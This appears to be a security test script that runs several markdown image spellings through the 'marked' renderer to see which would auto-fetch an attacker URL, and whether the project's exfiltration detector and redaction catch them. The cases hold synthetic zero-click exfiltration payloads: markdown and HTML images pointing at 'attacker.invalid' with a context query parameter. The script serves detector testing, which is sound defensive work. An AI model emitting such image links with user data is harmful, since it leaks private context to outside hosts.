// T66 — independent markdown oracle for the reference-image spellings the
// enumeration's "already covered" row (C2 / `egress.reference-link-exfil`)
// claims to cover.
//
// The oracle is `marked` (present in this checkout's node_modules, offline): a
// CommonMark/GFM renderer with no relationship to this codebase. The question it
// answers is the only one that matters here — does the spelling render as an
// <img> whose src is the attacker host, i.e. does a markdown auto-render client
// fetch it with no click?
//
// Read-only, offline, synthetic hosts only.
// Usage: bun T66-md-oracle.ts [out.json]
import { marked } from "marked";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { applyRedaction } from "../../../../src/security/redact";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;

const cases: Record<string, string> = {
  fullReference: `![a][a]\n\n[a]: ${U}\n`,
  collapsedReference: `![a][]\n\n[a]: ${U}\n`,
  shortcutReference: `![a]\n\n[a]: ${U}\n`,
  shortcutReferenceInProse: `See ![logo] for the badge.\n\n[logo]: ${U}\n`,
  collapsedUppercaseRef: `![Logo][]\n\n[logo]: ${U}\n`,
  inlineNestedBrackets: `![a[b]c](${U})`,
  inlineBaseline: `![a](${U})`,
  htmlImgBaseline: `<img src="${U}">`,
  // benign controls
  ctlRelativeShortcut: `![a]\n\n[a]: /assets/logo.png\n`,
  ctlPlainLinkShortcut: `[a]\n\n[a]: ${U}\n`,
};

type Row = {
  id: string;
  rendersImgWithAttackerHost: boolean;
  detectorFindings: number;
  policyIds: string[];
  maskedStillLeaksHost: boolean;
  verdict: "flagged" | "partial" | "released";
  html: string;
};

const rows: Row[] = [];
for (const [id, text] of Object.entries(cases)) {
  const html = await marked.parse(text, { async: true });
  // does a real renderer emit an auto-fetching <img> pointing at the host?
  const imgSrcs = [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/gi)].map((m) => m[1] ?? "");
  const findings = detectExfil(text, []);
  const redacted = applyRedaction(text, findings) as unknown;
  const masked =
    typeof redacted === "string"
      ? redacted
      : ((redacted as { text?: string }).text ?? String(redacted));
  rows.push({
    id,
    rendersImgWithAttackerHost: imgSrcs.some((s) => s.includes(ATT)),
    detectorFindings: findings.length,
    policyIds: [...new Set(findings.map((f) => f.policyId))],
    maskedStillLeaksHost: masked.includes(ATT),
    verdict:
      findings.length === 0 ? "released" : masked.includes(ATT) ? "partial" : "flagged",
    html: html.replace(/\n/g, " ").trim(),
  });
}

for (const r of rows) {
  console.log(
    `${r.id.padEnd(24)} rendererFetches=${String(r.rendersImgWithAttackerHost).padEnd(5)} detector=${r.verdict.padEnd(8)} ids=${JSON.stringify(r.policyIds)}  html=${r.html.slice(0, 90)}`,
  );
}

const bypasses = rows
  .filter((r) => r.rendersImgWithAttackerHost && r.verdict !== "flagged")
  .map((r) => r.id);
const falsePositives = rows
  .filter((r) => !r.rendersImgWithAttackerHost && r.verdict !== "released")
  .map((r) => r.id);
console.log(
  JSON.stringify({ cases: rows.length, bypasses, falsePositives }, null, 2),
);

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ bypasses, falsePositives, rows }, null, 2));
